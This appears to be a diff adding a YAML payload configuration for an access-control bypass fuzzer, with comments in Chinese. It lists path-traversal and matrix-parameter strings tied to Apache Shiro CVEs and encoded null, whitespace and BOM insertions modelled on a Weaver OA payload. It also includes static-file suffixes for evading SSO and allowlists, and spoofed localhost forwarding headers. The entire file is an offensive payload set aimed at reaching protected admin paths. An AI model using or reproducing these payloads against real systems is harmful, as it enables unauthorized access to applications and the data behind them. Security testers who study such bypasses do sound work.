@@ -1,0 +1,157 @@
+prefix: #取得/admin/xxx/getUser 中的admin添加前缀，必须以/结尾
+    - "\\"
+    - "/"
+    - ";/"  #CVE-2020-11989
+    - "..;/"
+    #白名单 + CVE-2020-1957，/demo/..;/admin/index其中demo为授权路径，admin/index为鉴权路径
+    - "images/..;/"
+    - "images;/../"
+    - "public/..;/"
+    - "static/..;/"
+    - "css/..;/"
+    - "resource/..;/"
+    #白名单 + CVE-2016-6802，在访问路径前加上/任意目录名/../，即可绕过访问
+    - "images/../"
+    - "public/../"
+    - "static/../"
+    - "css/../"
+    - "resource/../"
+    #else
+    - "%2e/"
+    - ";/"
+    - "./"
+    - "%20/"
+    - "%09/"
+    - ".;/"
+    - "..%00/"
+    - "..%0d/"
+    - "..%5c/"
+    - "#/../"
+#仿照weaver的空格绕过，增加前缀 /services%20/WorkflowServiceXml
+    # UTF-8 编码
+    - "%00"    # 空字符 (NUL)
+    - "%20"    # 空格，类似weaver
+    - "%09"    # 制表符 (TAB)
+    - "%0A"    # 换行符 (LF)
+    - "%0D"    # 回车符 (CR)
+    - "%0B"    # 垂直制表符 (VT)
+    - "%0C"    # 换页符 (FF)
+    - "%A0"    # 不间断空格 (NBSP)
+    - "%FE%FF" # UTF-8 BOM (Byte Order Mark)
+
+    # UTF-16 编码
+    - "%FF%FE%00"    # 空字符 (NUL)
+    - "%FF%FE%20"    # 空格
+    - "%FF%FE%09"    # 制表符 (TAB)
+    - "%FF%FE%0A"    # 换行符 (LF)
+    - "%FF%FE%0D"    # 回车符 (CR)
+    - "%FF%FE%0B"    # 垂直制表符 (VT)
+    - "%FF%FE%0C"    # 换页符 (FF)
+    - "%FF%FE%A0"    # 不间断空格 (NBSP)
+    - "%FF%FE%EF%BB%BF" # UTF-16 BOM (Byte Order Mark)
+
+#根据/services%20/WorkflowServiceXml泛微的payload，给非末尾路径的后面也添加fuzz，主要是添加各种url编码的空字符串
+middle_suffix:
+    # UTF-8 编码
+    - "%00"    # 空字符 (NUL)
+    - "%20"    # 空格
+    - "%09"    # 制表符 (TAB)
+    - "%0A"    # 换行符 (LF)
+    - "%0D"    # 回车符 (CR)
+    - "%0B"    # 垂直制表符 (VT)
+    - "%0C"    # 换页符 (FF)
+    - "%A0"    # 不间断空格 (NBSP)
+    - "%FE%FF" # UTF-8 BOM (Byte Order Mark)
+
+    # UTF-16 编码
+    - "%FF%FE%00"    # 空字符 (NUL)
+    - "%FF%FE%20"    # 空格
+    - "%FF%FE%09"    # 制表符 (TAB)
+    - "%FF%FE%0A"    # 换行符 (LF)
+    - "%FF%FE%0D"    # 回车符 (CR)
+    - "%FF%FE%0B"    # 垂直制表符 (VT)
+    - "%FF%FE%0C"    # 换页符 (FF)
+    - "%FF%FE%A0"    # 不间断空格 (NBSP)
+    - "%FF%FE%EF%BB%BF" # UTF-16 BOM (Byte Order Mark)
+
+
+suffix: #取得/admin/xxx/getUser中的getUser，这里只给末尾路径添加fuzz
+#静态文件后缀绕过
+    - ".js"
+    - ".css"
+    - ".json"
+    - ".html"
+    - ".jpg"
+    - ".jpeg"
+    - ".png"
+    - ".gif"
+    - ".svg"
+    - ".doc"
+    - ".docx"
+    - ".pdf"
+    - "/1.css"   #bypass强制SSO
+#矩阵参数绕过
+    - ";.js"
+    - ";.css"
+    - ";.json"
+    - ";.html"
+    - ";.jpg"
+    - ";.jpeg"
+    - ";.png"
+    - ";.gif"
+    - ";.svg"
+    - ";.doc"
+    - ";.docx"
+    - ";.pdf"
+    - ";swagger-ui" #Aj-report白名单后缀
+    - ";swagger-resources"  #Aj-report白名单后缀
+#else
+    - "/"       #金和oa restful风格绕过
+    - "/."
+    - "/./"
+    - "%09"
+    - "?"
+    - "?error"
+    - "#"
+    - "/*"
+    - "%26"
+    - "/images/..;"
+    - "/public/..;"
+    - "/static/..;"
+    - ";/"
+    - "%20"
+    - "/%20"        #CVE-2020-17523
+    - "/%252fABCDEFG"   #CVE-2020-11989
+    - "/a%25%32%66a"    #CVE-2020-11989
+    - "/%3BABCDEFG"    #CVE-2020-13933
+    - "/%2e"    #CVE-2020-17510
+    - "/a%0any" #CVE-2022-32532
+
+
+
+headers:
+    -
+      X-Custom-IP-Authorization: 127.0.0.1
+      X-Forwarded-For: 127.0.0.1
+      X-Client-IP: 127.0.0.1
+      X-Remote-Addr: 127.0.0.1
+      X-Originating-IP: 127.0.0.1
+      Referer: http://127.0.0.1
+#    - X-Original-URL: {{Baseurl}}
+    - X-Forwarded-For: 127.0.0.1:80
+    - X-Forwarded-For: http://127.0.0.1
+    - X-Host: 127.0.0.1
+#      http/1.0 无头协议绕过
+    - HTTP-Version: HTTP/1.0
+
+#弱认证 todo
+#    - Cookie: admin=1
+#      Authorization: admin=1
+#      token: admin=1
+#      auth: admin=1
+#    - Cookie: isAdmin=1
+
+
+
+
+
